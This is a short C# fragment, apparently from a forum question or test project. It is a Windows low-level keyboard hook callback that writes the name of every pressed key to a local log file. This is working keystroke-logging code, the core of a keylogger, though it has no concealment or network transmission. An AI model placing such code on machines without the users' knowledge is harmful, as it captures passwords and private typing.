    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            var keyName = Enum.GetName(typeof(Keys), vkCode);
            var path = @"C:\test\logfile.txt";
                
            // Handle the key press here
            var text = ((Keys)vkCode).ToString();
            File.AppendAllText(path, text);
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }
